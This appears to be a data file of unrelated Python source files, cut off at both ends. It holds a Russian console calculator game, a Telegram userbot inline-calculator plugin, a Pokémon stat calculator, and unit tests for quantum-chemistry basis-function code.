calc.calcc(args1, args2, args3)\n            elif zapros == \"\u0448\u0430\u043d\u0441\u044b\":\n                calc.chance(uberargs)\n            elif zapros == \"\u0434\u0430\u0442\u0430\" or zapros == \"data\":\n                calc.date(args1)\n            elif zapros == \"\u0447\u0438\u0441\u043b\u043e\":\n                calc.randomn(args1, args2)\n            elif zapros == \"\u0443\u0434\u0430\u043b\u0438\u0442\u044c \u0434\u0430\u043d\u043d\u044b\u0435\":\n                delete()\n            elif zapros == \"\u0440\u0430\u0431\u043e\u0442\u0430\" or zapros == \"job\":\n                calc.jobmain()\n            elif zapros == \"\u043f\u0440\u043e\u0444\u0438\u043b\u044c\":\n                calc.profile()\n            elif zapros == \"\u043c\u0430\u0433\u0430\u0437\u0438\u043d\" or zapros == \"shop\":\n                calc.shopping()\n            elif zapros == \"\u0443\u0440\u043e\u0432\u0435\u043d\u044c\" or zapros == \"lvl\":\n                calc.levelup()\n            elif zapros == \"\u043f\u043e\u0433\u043e\u0434\u0430\" or zapros == \"weather\":\n                calc.weather(args1)\n            elif zapros == \"\u043a\u0443\u0440\u0441\":\n                calc.valute()\n            elif zapros == \"\u0443\u0434\u0430\u0447\u0430\":\n                calc.luck()\n            elif zapros == \"\u043e\u0447\u0438\u0441\u0442\u0438\u0442\u044c\" or zapros == \"clear\":\n                clrclear()\n            elif zapros == \"\u0445\u0435\u043b\u043f\" or zapros == \"help\":\n                print(helpme)\n            elif zapros == \"\u043c\u0430\u0439\u043d\u043a\u0440\u0430\u0444\u0442\":\n                calc.secret()\n            elif zapros == \"\u0431\u043e\u043c\u0431\u0430\":\n                calc.bomb()\n            elif zapros == \"\u0432\u044b\u0445\u043e\u0434\" or zapros == \"exit\":\n                exit(calc)\n            elif zapros == \"\u043f\u0440\u0435\u0444\u0438\u043a\u0441\":\n                calc.prefix(uberargs)\n            elif zapros == \"\u043c\u043e\u043d\u0435\u0442\u0430\":\n                calc.orelireshka()\n            elif zapros == \"\u043a\u043e\u043d\u0444\u0438\u0433\":\n                print(\"\u0432\u0440\u0435\u043c\u0435\u043d\u043d\u043e \u0432\u044b\u0440\u0435\u0437\u0430\u043b \u0438\u0437 \u043a\u0430\u043b\u044c\u043a\u0443\u043b\u044f\u0442\u043e\u0440\u0430\")\n            else:\n                print(\"\u041d\u0435 \u043f\u043e\u043d\u0438\u043c\u0430\u044e!\")\n            if argvtest:\n                sys.exit()\n            zapros = None\n\n# \u0432\u044b\u0445\u043e\u0434 \u0447\u0435\u0440\u0435\u0437 ctrl+c\n    except (KeyboardInterrupt, EOFError):\n        print(\"\u0412\u044b\u0445\u043e\u0434\u0438\u043c\")\n        with shelve.open(\"log\") as stat:\n            stat[\"\u043a\u0430\u043b\u043a\"] = calc\n        sys.exit()\n# \u0444\u0438\u0445\u043d\u044f \u043d\u0443\u0436\u043d\u0430\u044f \u0434\u043b\u044f \u0437\u0430\u043f\u043e\u043c\u0438\u043d\u0430\u043d\u0438\u044f \u0438\u043c\u0435\u043d\u0438\n\n\ndef run():\n    if sys.platform == \"win32\":\n        memory = os.path.isfile(\"log.dat\")\n    else:\n        memory = os.path.isfile(\"log\")\n    jsontest = os.path.isfile(\"log.json\")\n    if all([memory, jsontest]):\n        with shelve.open(\"log\") as stat:\n            calc = stat[\"\u043a\u0430\u043b\u043a\"]\n        with open(\"log.json\", \"r\") as stat:\n            setting = json.load(stat)\n    else:\n        calc = Main()\n        setting = {\"timesleep\": 1}\n        with open(\"log.json\", \"w\") as stat:\n            json.dump(setting, stat)\n        calc.login()\n        with shelve.open(\"log\") as stat:\n            stat[\"\u043a\u0430\u043b\u043a\"] = calc\n        print(calc.name + \", \u043d\u0430\u0448 \u0430\u0433\u0435\u043d\u0442 \u0444\u0441\u0431 \u0443\u0436\u0435 \u0432\u044b\u0441\u043b\u0430\u043d \u043a \u0432\u0430\u043c \")\n    key = None\n    args1 = None\n    args2 = None\n    args3 = None\n    argvtest = False\n    uberargs = None\n    try:\n        uberargs = sys.argv[1:]\n        uberargs = \" \".join(uberargs)\n        key = sys.argv[1]\n        args1 = sys.argv[2]\n        args2 = sys.argv[3]\n        args3 = sys.argv[4]\n    except IndexError:\n        None\n    if key == os.path.basename(__file__):\n        key = None\n    if key:\n        argvtest = True\n    lobby(calc, key, args1, args2, args3, argvtest, uberargs)\n\n\nif __name__ == \"__main__\":\n    run()\n", "86": "", "87": "", "88": "# Ultroid - UserBot\r\n# Copyright (C) 2021-2022 TeamUltroid\r\n#\r\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\r\n# PLease read the GNU Affero General Public License in\r\n# .\r\n\"\"\"\r\n\u2718 Commands Available -\r\n\r\n\u2022`{i}calc` - Inline Calculator\r\n\r\n\"\"\"\r\nimport re\r\n\r\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\r\n\r\nCALC = {}\r\n\r\nm = [\r\n    \"AC\",\r\n    \"C\",\r\n    \"\u232b\",\r\n    \"%\",\r\n    \"7\",\r\n    \"8\",\r\n    \"9\",\r\n    \"+\",\r\n    \"4\",\r\n    \"5\",\r\n    \"6\",\r\n    \"-\",\r\n    \"1\",\r\n    \"2\",\r\n    \"3\",\r\n    \"x\",\r\n    \"00\",\r\n    \"0\",\r\n    \".\",\r\n    \"\u00f7\",\r\n]\r\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\r\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\r\nlst.append([Button.inline(\"=\", data=\"calc=\")])\r\n\r\n\r\n@ultroid_cmd(pattern=\"calc\")\r\nasync def icalc(e):\r\n    udB.del_key(\"calc\")\r\n    if e.client._bot:\r\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\r\n    results = await e.client.inline_query(asst.me.username, \"calc\")\r\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\r\n    await e.delete()\r\n\r\n\r\n@in_pattern(\"calc\", owner=True)\r\nasync def _(e):\r\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\r\n    await e.answer([calc])\r\n\r\n\r\n@callback(re.compile(\"calc(.*)\"), owner=True)\r\nasync def _(e):\r\n    x = (e.data_match.group(1)).decode()\r\n    user = e.query.user_id\r\n    get = None\r\n    if x == \"AC\":\r\n        if CALC.get(user):\r\n            CALC.pop(user)\r\n        await e.edit(\r\n            get_string(\"calc_1\"),\r\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\r\n        )\r\n    elif x == \"C\":\r\n        if CALC.get(user):\r\n            CALC.pop(user)\r\n        await e.answer(\"cleared\")\r\n    elif x == \"\u232b\":\r\n        if CALC.get(user):\r\n            get = CALC[user]\r\n        if get:\r\n            CALC.update({user: get[:-1]})\r\n            await e.answer(str(get[:-1]))\r\n    elif x == \"%\":\r\n        if CALC.get(user):\r\n            get = CALC[user]\r\n        if get:\r\n            CALC.update({user: get + \"/100\"})\r\n            await e.answer(str(get + \"/100\"))\r\n    elif x == \"\u00f7\":\r\n        if CALC.get(user):\r\n            get = CALC[user]\r\n        if get:\r\n            CALC.update({user: get + \"/\"})\r\n            await e.answer(str(get + \"/\"))\r\n    elif x == \"x\":\r\n        if CALC.get(user):\r\n            get = CALC[user]\r\n        if get:\r\n            CALC.update({user: get + \"*\"})\r\n            await e.answer(str(get + \"*\"))\r\n    elif x == \"=\":\r\n        if CALC.get(user):\r\n            get = CALC[user]\r\n        if get:\r\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\r\n                get = get[:-1]\r\n            out = eval(get)\r\n            try:\r\n                num = float(out)\r\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\r\n            except BaseException:\r\n                CALC.pop(user)\r\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\r\n        await e.answer(\"None\")\r\n    else:\r\n        if CALC.get(user):\r\n            get = CALC[user]\r\n        if get:\r\n            CALC.update({user: get + x})\r\n            return await e.answer(str(get + x))\r\n        CALC.update({user: x})\r\n        await e.answer(str(x))\r\n\r\n\r\n@callback(\"recalc\", owner=True)\r\nasync def _(e):\r\n    m = [\r\n        \"AC\",\r\n        \"C\",\r\n        \"\u232b\",\r\n        \"%\",\r\n        \"7\",\r\n        \"8\",\r\n        \"9\",\r\n        \"+\",\r\n        \"4\",\r\n        \"5\",\r\n        \"6\",\r\n        \"-\",\r\n        \"1\",\r\n        \"2\",\r\n        \"3\",\r\n        \"x\",\r\n        \"00\",\r\n        \"0\",\r\n        \".\",\r\n        \"\u00f7\",\r\n    ]\r\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\r\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\r\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\r\n    await e.edit(get_string(\"calc_1\"), buttons=lst) #null\r\n", "89": "from sympy import Ordinal\n\n\nclass stat_calc():\n    def hp_calculator(calc_HP, calc_IV, calc_EV, calc_Level):\n        calc_total = ((2 * calc_HP + calc_IV + (calc_EV / 4)) * calc_Level/100) + calc_Level + 10\n        return calc_total\n    \n    def attack_calculator(calc_Attack, calc_IV, calc_EV, calc_Level, calc_nature):\n        if calc_nature > 0 or calc_nature < 5:\n            nature_stat = 1.1\n        elif calc_nature == 5 or calc_nature == 10 or calc_nature == 15 or calc_nature == 20:\n            nature_stat = 0.9\n        else :\n            nature_stat = 1\n        calc_total = (((2 * calc_Attack + calc_IV + (calc_EV / 4)) * calc_Level / 100) + 5) * nature_stat\n        return calc_total\n\n    def defense_calculator(calc_defense, calc_IV, calc_EV, calc_Level, calc_nature):\n        if calc_nature == 5 or calc_nature == 7 or calc_nature == 8 or calc_nature == 9:\n            nature_stat = 1.1\n        elif calc_nature == 1 or calc_nature == 11 or calc_nature == 16 or calc_nature == 21:\n            nature_stat = 0.9\n        else :\n            nature_stat = 1\n        calc_total = (((2 * calc_defense + calc_IV + (calc_EV / 4)) * calc_Level / 100) + 5) * nature_stat\n        return calc_total\n\n    def SpAttack_calculator(calc_SpAttack, calc_IV, calc_EV, calc_Level, calc_nature):\n        if calc_nature == 15 or calc_nature == 16 or calc_nature == 17 or calc_nature == 19:\n            nature_stat = 1.1\n        elif calc_nature == 3 or calc_nature == 8 or calc_nature == 13 or calc_nature == 23:\n            nature_stat = 0.9\n        else :\n            nature_stat = 1\n        calc_total = (((2 * calc_SpAttack + calc_IV + (calc_EV / 4)) * calc_Level / 100) + 5) * nature_stat\n        return calc_total\n    \n    def SpDefense_calculator(calc_SpDefense, calc_IV, calc_EV, calc_Level, calc_nature):\n        if calc_nature == 20 or calc_nature == 21 or calc_nature == 22 or calc_nature == 23:\n            nature_stat = 1.1\n        elif calc_nature == 4 or calc_nature == 9 or calc_nature == 14 or calc_nature == 19:\n            nature_stat = 0.9\n        else :\n            nature_stat = 1\n        calc_total = (((2 * calc_SpDefense + calc_IV + (calc_EV / 4)) * calc_Level / 100) + 5) * nature_stat\n        return calc_total\n\n    def Speed_calculator(calc_Speed, calc_IV, calc_EV, calc_Level, calc_nature):\n        if calc_nature == 10 or calc_nature == 11 or calc_nature == 13 or calc_nature == 14:\n            nature_stat = 1.1\n        elif calc_nature == 2 or calc_nature == 7 or calc_nature == 17 or calc_nature == 22:\n            nature_stat = 0.9\n        else :\n            nature_stat = 1\n        calc_total = (((2 * calc_Speed + calc_IV + (calc_EV / 4)) * calc_Level / 100) + 5) * nature_stat\n        return calc_total", "90": "import sys\nimport numpy as np\nfrom scipy.integrate import quad\nfrom scipy.linalg import eig, solve\nfrom sympy import Symbol, oo, diff, integrate, exp, sqrt\n\nfrom r1basis import *\nfrom opt_green import *\nsys.path.append(\"../src_py/nnewton\")\nfrom nnewton import *\n\nimport unittest\nclass Test_tmp(unittest.TestCase):\n    def setUp(self):\n        pass\n    \nclass Test_r1_linear_comb(unittest.TestCase):\n    def setUp(self):\n        pass\n\n    def test_size(self):\n\n        for (m, fs) in zip([1, 2], [LC_STOs(), LC_GTOs()]): \n            fs.add(1.1, 2, 1.3-0.2j)\n            fs.add(0.1, 1, 1.2-0.2j)\n            fs.add(0.2, 3, 1.4-0.1j)\n            self.assertEqual(3, fs.size())\n\n    def test_getter(self):\n        for (m, fs) in zip([1, 2], [LC_STOs(), LC_GTOs()]): \n            fs.add(1.1, 2, 1.3-0.2j)\n            fs.add(0.1, 1, 1.2-0.2j)\n            fs.add(0.2, 3, 1.4-0.1j)\n            self.assertAlmostEqual(1.1, fs.c(0))\n            self.assertAlmostEqual(1.2-0.2j, fs.z(1))\n            self.assertEqual(3, fs.n(2))\n        \n    def test_conj(self):\n        \n        r = 1.4\n        c0 = 1.1; n0 = 1; z0 = 0.35; \n        c1 = 1.2; n1 = 2; z1 = 0.3; \n\n        for (m, fs) in zip([1,2], [LC_STOs(), LC_GTOs()]): \n            fs.add(c0, n0, z0)\n            fs.add(c1, n1, z1)\n            y = fs.at_r([r])[0]\n            self.assertAlmostEqual(y,\n                                   c0 * r**n0 * np.exp(-z0**m)+\n                                   c1 * r**n1 * np.exp(-z1**m))\n\n    def test_clone(self):\n        \n        r = 1.4\n        c0 = 1.1; n0 = 1; z0 = 0.35; \n        c1 = 1.2; n1 = 2; z1 = 0.3; \n\n        for (m, fs) in zip([1,2], [LC_STOs(), LC_GTOs()]): \n            fs.add(c0, n0, z0)\n            fs.add(c1, n1, z1)\n            \n            fs2 = fs.clone()\n            fs.add(1.1, 2, 3.3)\n            self.assertEqual(2, fs2.size())\n\n    def test_conj(self):\n        \n        r = 1.4\n        c0 = 1.1; n0 = 1; z0 = 0.35; \n        c1 = 1.2; n1 = 2; z1 = 0.3; \n\n        for (m, fs) in zip([1,2], [LC_STOs(), LC_GTOs()]): \n            fs.add(c0, n0, z0)\n            fs.add(c1, n1, z1)\n            c_fs = fs.conj()\n            y = fs.at_r([r])[0]\n            cy= c_fs.at_r([r])[0]\n            self.assertAlmostEqual(y.conjugate(), cy)\n            \nclass Test_gto(unittest.TestCase):\n\n    def setUp(self):\n        gtos = GTOs()\n        gtos.add(1, 1.1)\n        gtos.add(2, 1.4)\n        gtos.add(3, [1.2, 1.3-0.1j])\n\n        g1 = LC_GTOs()\n        g1.add(1.1, 5, 1.3)\n        g1.add(0.1, 6, 1.4)\n        gtos.add(g1)\n\n        gtos.setup()\n        self.gtos = gtos\n\n        r = Symbol('r')\n        self.r = r\n        fs = [r**1*exp(-1.1*r**2),\n              r**2*exp(-1.4*r**2),\n              r**3*exp(-1.2*r**2),\n              r**3*exp(-(1.3-0.1j)*r**2),\n              1.1*r**5*exp(-1.3*r**2)+0.1*r**6*exp(-1.4*r**2)]\n        self.fs = fs\n        \"\"\"\n        fs = [lambda r: r     * np.exp(-1.1*r*r),\n              lambda r: r*r   * np.exp(-1.4*r*r),\n              lambda r: r*r*r * np.exp(-1.2*r*r),\n              lambda r: r*r*r * np.exp(-(1.3-0.1j)*r*r),\n              lambda r: 1.1*r**5*np.exp(-1.3*r*r) + \n              0.1*r**6*np.exp(-1.4*r*r)]\n        self.fs = fs\n        \"\"\"\n    \n    def test_size(self):\n\n        gtos = self.gtos\n        self.assertEqual(5, gtos.size())\n        self.assertFalse(gtos.is_prim_all())\n\n        gtos = GTOs()\n        gtos.add(2, 1.1)\n        gtos.add(2, 1.1)\n        gtos.add(3, [1.2, 1.3-0.1j])\n        gtos.setup()\n        self.assertEqual(4, gtos.size())\n        self.assertTrue(gtos.is_prim_all())\n\n    def test_accessor(self):\n\n        gtos = self.gtos\n        self.assertEqual(2, gtos.basis(1).n(0))\n        self.assertEqual(6, gtos.basis(4).n(1))\n        basis_i = gtos.basis(0).clone()\n        basis_i.set_z(0, 1.3)\n        gtos.replace(0, basis_i)\n        self.assertAlmostEqual(1.3, gtos.basis(0).z(0))\n        \n    def test_clone(self):\n        g = self.gtos.clone()\n        self.gtos.add(2, 3.0)\n        self.gtos.add(2, 3.0)\n        self.gtos.add(2, 3.0)\n        self.assertEqual(5, g.size())\n\n    def test_conj(self):\n        cg = self.gtos.conj()\n        self.assertAlmostEqual(1.3+0.1j, cg.basis(3).z(0))\n        \n    def _test_raise(self):\n        g = GTOs()\n        g.add(2, 1.1)\n        self.assertRaises(RuntimeError, calc_rm_mat(g, 0, g))\n\n    def test_at_r(self):\n        n1 = 2; z1 = 1.0\n        n2 = 2; z2 = 1.5\n        \n        g = GTOs()\n        g.add(n1, z1)\n        g.add(n2, z2)\n        g.setup()\n        \n        c1 = g.basis(0).c(0)\n        c2 = g.basis(1).c(0)\n        \n        d1 = 1.1\n        d2 = 1.2\n        \n        r = 2.5\n\n        self.assertAlmostEqual(d1*c1*(r**n1)*np.exp(-z1*r*r)+\n                               d2*c2*(r**n2)*np.exp(-z2*r*r),\n                               g.at_r([r], [d1, d2])[0])\n        \n    def test_hydrogen_atom(self):\n        g =  GTOs()\n        g.add(1, [2.5**n for n in range(-5,5)])\n        g.setup()\n        s = calc_rm_mat(g,0,g)\n        h = -0.5 * calc_d2_mat(g, g) - calc_rm_mat(g, -1, g)\n        (val,vec) =  eig(h, s)\n        index = 5\n        ene = val[index]\n        c   = vec[:,index]\n        self.assertAlmostEqual(-0.5, val[5], places=3)\n\n        ## normalization\n        nterm = 1.0/np.sqrt(np.dot(c, np.dot(s, c)))\n        c1 = -nterm * c\n        r0 = 2.5\n        y_calc = g.at_r([r0], c1)[0]\n        y_ref  = 2.0 * r0 * np.exp(-r0)\n        self.assertAlmostEqual(y_ref, y_calc, places=4)\n\n    def test_hydrogen_atom_p(self):\n        g =  GTOs()\n        g.add(2, [2.5**n for n in range(-5,5)])\n        g.setup()\n        s = calc_rm_mat(g, 0, g)\n        h = -0.5 * calc_d2_mat(g,g) + calc_rm_mat(g,-2,g) - calc_rm_mat(g,-1,g)\n        (val,vec) =  eig(h, s)\n        self.assertAlmostEqual(-0.125, val[6], places=3)\n\nclass Test_sto(unittest.TestCase):\n    def setUp(self):\n        pass\n\n    def test_accessor(self):\n        s2 = LC_STOs().add(1.2, 2, 1.1).add(1.1, 3, 1.4)\n        fs = STOs().add(1, 2.0).add_not_normal(1.1, 2, 3.0).add(s2).setup()\n        self.assertTrue(fs.is_prim(0))\n        self.assertTrue(fs.is_prim(1))\n        self.assertFalse(fs.is_prim(2))\n        \n        self.assertTrue(fs.has_coef(0))\n        self.assertTrue(fs.has_coef(1))\n        self.assertTrue(fs.has_coef(2))\n\n        self.assertTrue(fs.is_normal(0))\n        self.assertFalse(fs.is_normal(1))\n        self.assertTrue(fs.is_normal(2))        \n\n        fs = STOs().add(2, 1.1)\n        self.assertFalse(fs.has_coef(0))\n        \n    def test_int_sto(self):\n        z = 2.3\n        for n in [0, 1, 3]:\n            f = lambda r: r**n * np.exp(-z*r)\n            nume, err = quad(f, 0, 15.0)\n            self.assertAlmostEqual(nume, sto_int(n, z))\n\n    def test_calc_vec(self):\n\n        stos = STOs()\n        stos.add(1, 1.1)\n        stos.add(2, 1.2)\n        stos.setup()\n\n        sto1 = LC_STOs()\n        sto1.add(2.0, 2, 1.0)\n        \n        vec = calc_vec(stos, sto1)\n        self.assertEqual(2, len(vec))\n\n    def test_hydrogen(self):\n        s = STOs()\n        s.add(2, 0.5)\n        s.setup()\n        \n        h = -0.5 * calc_d2_mat(s,s) + calc_rm_mat(s,-2,s) - calc_rm_mat(s,-1,s)\n        self.assertAlmostEqual(-0.125, h[0,0])\n\nclass Test_matele(unittest.TestCase):\n    def setUp(self):\n        pass\n\n    def test_sto_gto(self):\n        for n in [0,1,2,3,4,5]:\n            s = STOs().add_not_normal(2.0, n, 1.2).setup()\n            g = GTOs().add_not_normal(1.1, 0, 1.1).setup()\n            ele = calc_rm_mat(s, 0, g)[0, 0]\n            sg = lambda x: x**n*2.0*1.1*np.exp(-1.2*x-1.1*x*x)\n            (ref, err) = quad(sg, 0, 10.0)\n            self.assertAlmostEqual(ref, ele)\n    \n    def test_mat(self):\n        s = STOs().add_not_normal(2.0, 3, 1.2-0.3j).setup()\n        g = GTOs().add_not_normal(1.3, 2, 1.1-0.1j).setup()\n\n        r2_s_lc = LC_STOs().add(2.0, 5, 1.2-0.3j)\n        r2_g_lc = LC_GTOs().add(1.3, 4, 1.1-0.1j)\n        \n        s2s_calc = calc_rm_mat(s, 2, s)[0, 0]\n        g2g_calc = calc_rm_mat(g, 2, g)[0, 0]\n        sDs_calc = calc_d2_mat(s, s)[0, 0]\n        gDg_calc = calc_d2_mat(g, g)[0, 0]\n\n        s2s2 = calc_vec(s, r2_s_lc)[0]\n        g2g2 = calc_vec(g, r2_g_lc)[0]\n\n        ## see support/int_exp.py\n        s2s_ref = -27.5296456055511 + 37.4411871137165j\n        g2g_ref = 0.16651663387627 + 0.0546850960763247j\n        sDs_ref = -0.526917955926652 - 1.46206690245985j\n        gDg_ref = -0.395454606004856 - 0.0541117842324456j\n\n        self.assertAlmostEqual(s2s_ref, s2s_calc)\n        self.assertAlmostEqual(g2g_ref, g2g_calc)\n        self.assertAlmostEqual(sDs_ref, sDs_calc)\n        self.assertAlmostEqual(gDg_ref, gDg_calc)\n\n        self.assertAlmostEqual(g2g_ref, g2g2)\n        self.assertAlmostEqual(s2s_ref, s2s2)\n\n    def test_mat2(self):\n        s = STOs().add_not_normal(2.2, 3, 1.1).setup()\n        g = GTOs().add_not_normal(1.3, 2, 1.2).setup()\n        \n        s2s_calc = calc_rm_mat(s, 2, s)[0, 0]\n        g2g_calc = calc_rm_mat(g, 2, g)[0, 0]\n        s2g_calc = calc_rm_mat(s, 2, g)[0, 0]\n        sDs_calc = calc_d2_mat(s, s)[0, 0]\n        gDg_calc = calc_d2_mat(g, g)[0, 0]\n        sDg_calc = calc_d2_mat(s, g)[0, 0]\n\n        ## see support/int_exp.py\n        s2s_ref= 161.644807242673\n        g2g_ref= 0.131127436620057\n        s2g_ref= 0.663645309086432\n        sDs_ref= -3.38091660405710\n        gDg_ref= -0.352470549634713\n        sDg_ref= 0.208872645967760\n\n        self.assertAlmostEqual(s2s_ref, s2s_calc)\n        self.assertAlmostEqual(g2g_ref, g2g_calc)\n        self.assertAlmostEqual(s2g_ref, s2g_calc)\n        self.assertAlmostEqual(sDs_ref, sDs_calc)\n        self.assertAlmostEqual(gDg_ref, gDg_calc)\n        self.assertAlmostEqual(sDg_ref, sDg_calc)\n        \n    def test_stv(self):\n        s = STOs().add(3, 1.1).add(2, 0.3-0.1j).setup()\n        driv = LC_STOs().add(1.1, 2, 1.0)\n        opt_green = OptGreen_SSS(driv, s, driv, 1, 1.0)\n        opt_green.calc_S0_L00_R0()\n        print opt_green.L00()\n        \ndef test_vartrans(utest, f_xs, var, y0s, label):\n\n    ## -- basic test --\n    utest.assertEqual(var.Ny, len(y0s))\n\n    ## -- identity test --\n    x0s = var.xis(y0s)\n    y0s_2 = var.yks(x0s)\n    for i in range(var.Ny):\n        msg = \"{0},{1},{2},{3}\".format(label,i,y0s_2[i], y0s[i])\n        utest.assertAlmostEqual(y0s_2[i], y0s[i], msg=msg)\n        \n\n    df_x0s = ngrad(f_xs, x0s, 0.0001, method='c1')\n    ddf_x0s= nhess(f_xs, x0s, 0.0001, method='c1')\n\n    f_ys  = lambda ys: f_xs(var.xis(ys))        \n    df_y0s = ngrad(f_ys, y0s, 0.0001, method='c1')\n    ddf_y0s= nhess(f_ys, y0s, 0.0001, method='c1')\n\n    ## -- gradient --\n    ref  = df_y0s\n    calc = var.dF_dyk(df_x0s, x0s)\n    for i in range(var.Ny):\n        msg = \"i = {0}\\nref  = {1}\\ncalc = {2}\\n\".format(i, ref[i], calc[i])\n        utest.assertAlmostEqual(ref[i], calc[i], msg=msg)\n\n    ## -- hessian --\n    ref  = ddf_y0s\n    calc = var.d2F_dykdyl(df_x0s, ddf_x0s, x0s)\n    for i in range(var.Ny):\n        for j in range(var.Ny):\n            msg = \"Hessian transpose test\\n\"\n            msg +=\"label = {0}\\n\".format(label)\n            msg +=\"(i,j) = ({0},{1})\\n\".format(i, j)\n            msg +=\"H(i,j) = {0}\\n\".format(calc[j,i])\n            msg +=\"H(j,i) = {0}\\n\".format(calc[i,j])            \n            utest.assertAlmostEqual(calc[j,i], calc[i,j], msg=msg)\n            \n            msg = \"error on Hessian test\\n\"\n            msg +=\"label = {0}\\n\".format(label)\n            msg +=\"(i,j) = ({0},{1})\\n\".format(i, j)\n            msg +=\"ref  = {0}\\n\".format(ref[i, j])\n            msg +=\"calc = {0}\\n\".format(calc[i,j])\n            utest.assertAlmostEqual(ref[i,j], calc[i,j], msg=msg)\n\n    \nclass Test_VarTrans(unittest.TestCase):\n    def setUp(self):\n        pass\n\n\n\n    def test_log(self):\n        y0s = [-1.1]\n        var = VarTransLog()\n        f  = lambda xs: np.sin(2*xs[0])        \n        test_vartrans(self, f, var, y0s, \"log\")\n\n    def test_id(self):\n        y0s = [0.2]\n        var = VarTransId()\n        f  = lambda xs: np.sin(2*xs[0])\n        test_vartrans(self, f, var, y0s, \"id\")\n\n    def test_shift(self):\n\n        y0s = [0.1]\n        a0s = [0.3, 1.2, 0.1]\n        var = VarTransShift(a0s)\n        f_xs  = lambda xs: np.sin(xs[0]*xs[1]) + np.exp(xs[1]+xs[2]*xs[0])\n        test_vartrans(self, f_xs, var, y0s, \"shift\")\n\n    def test_scale(self):\n        y0s = [1.1]\n        a0s = [0.3, 1.2, 0.8]\n        var = VarTransScale(a0s)\n        f_xs  = lambda xs: np.sin(xs[0]*xs[1]) + np.exp(xs[1]+xs[2]*xs[0])\n        test_vartrans(self, f_xs, var, y0s, \"scale\")\n\n    def test_geometric(self):\n        \n        var = VarTransGeometric(4)\n        f_xs = lambda x: np.sin(x[0]+x[1]) * np.cos(x[2] * x[3])\n        y0s = [0.3, 1.4]\n        test_vartrans(self, f_xs, var, y0s, \"geometric\")\n\n    def test_comb(self):\n\n        a0s = [0.2,0.3]\n        y0s = [1.1, -0.1]\n        var = VarTransComb([([0,1], VarTransShift(a0s)),\n                            ([2],   VarTransLog())])\n        f_xs  = lambda xs: np.sin(xs[0]*xs[1]+xs[2]) * np.exp(xs[1]+xs[2])\n        test_vartrans(self, f_xs, var, y0s, \"comb1\")\n\n        y0s = [-0.1, 1.1]\n        var = VarTransComb([([2],   VarTransLog()),\n                            ([0,1], VarTransShift(a0s))])\n        test_vartrans(self, f_xs, var, y0s, \"comb2\")\n\n    def test_comb_mid(self):\n        y0s = [-0.2, 1.5, 0.1]\n        var = VarTransComb([( [0],     VarTransLog()),\n                            ( [1,2,3], VarTransGeometric(3))])\n        f_xs  = lambda xs: np.sin(xs[0]*xs[1]+xs[2]) * np.exp(xs[1]+xs[2]+xs[3])\n        test_vartrans(self, f_xs, var, y0s, \"comb_mid_2\")\n        \n        y0s = [-0.2, 1.5, 0.1]\n        var = VarTransComb([([0,1,2], VarTransGeometric(3)),\n                            ([3],     VarTransLog())])\n        f_xs  = lambda xs: np.sin(xs[0]*xs[1]+xs[2]*xs[3]) * np.exp(xs[1]+xs[2]+xs[3])\n        test_vartrans(self, f_xs, var, y0s, \"comb_mid_1\")\n        \n        y0s = [-0.2, 1.5, 0.1]\n        var = VarTransComb([([1,2,3], VarTransGeometric(3)),\n                            ([0],     VarTransLog())])\n        f_xs  = lambda xs: np.sin(xs[0]*xs[1]+xs[2]) * np.exp(xs[1]+xs[2]+xs[3])\n        test_vartrans(self, f_xs, var, y0s, \"comb_mid_2\")\n\n    def test_comb_big(self):\n\n        var = VarTransComb([\n            ([0,1,2],   VarTransShift([0.2, 0.3, 0.4])),\n            ([3],       VarTransLog()),\n            ([4],       VarTransId() ),\n            ([5,6,7,8], VarTransGeometric(4))])\n        y0s = [0.01, -0.1, 0.4, 1.1, 1.5]\n\n        f_xs  = lambda xs: (np.sin(sum(xs))\n                            +np.exp(xs[1]+xs[2]*xs[3])\n                            +np.cos(xs[4]+xs[5]*xs[6])\n                            +np.log(xs[7]+xs[8]*xs[0]))\n        test_vartrans(self, f_xs, var, y0s, \"comb_big\")\n\n        #print var\n\n    def test_comb_raise(self):\n        a0s = [0.2,0.3]\n        y0s = [1.1, -0.1]\n        self.assertRaises(lambda : VarTransComb([[0,3], [2]],\n                           [VarTransShift(a0s), VarTransLog()]))\n        self.assertRaises(lambda : VarTransComb([[0], [2]],\n                           [VarTransShift(a0s), VarTransLog()]))        \n            \nclass Test_green(unittest.TestCase):\n\n    def setUp(self):\n        pass\n\n    def assertVecAlmostEqual(self, a, b, places=5):\n        self.assertEqual(len(a), len(b))\n        for i in range(len(a)):\n            self.assertAlmostEqual(a[i], b[i], places=places)\n\n    def assertVarEqual(self, a, b):\n        self.assertAlmostEqual(a.Nx, b.Nx)\n        self.assertAlmostEqual(a.Ny, b.Ny)\n        yks = [0.1*(i+1)*(i+1) for i in range(a.Ny)]\n        xa = a.xis(yks)\n        xb = b.xis(yks)\n        for i in range(a.Ny):\n            msg = \"\"\"\n            Error on {0}\n            a = {1}\n            b = {2}\n            \"\"\".format(i, a, b)\n            self.assertAlmostEqual(xa[i], xb[i], msg = msg)\n        \n    def test_alpha(self):\n\n        ## from calc/stoh/l_5/res.d\n        ss = STOs()\n\n        ss.add(2, 0.9965751177-0.0013743026j)\n        ss.add(2, 1.0030366528-0.2836728004j)\n        ss.add(2, 0.8462928140-0.6952686244j)\n        ss.add(2, 0.4818046345-1.0023929406j)\n        ss.add(2, 0.1412093744-1.0662761427j)\n        ss.setup()\n\n        driv = LC_STOs()\n        driv.add(2.0, 2, 1.0)\n        \n        ene = 0.5\n\n        s = calc_rm_mat(ss, 0,  ss)\n        d2= calc_d2_mat(ss,     ss)\n        r2= calc_rm_mat(ss, -2, ss)\n        r1= calc_rm_mat(ss, -1, ss)\n        lmat = (  s * ene\n                  + d2* 0.5\n                  + r2* (-1.0)\n                  + r1)\n        mvec = 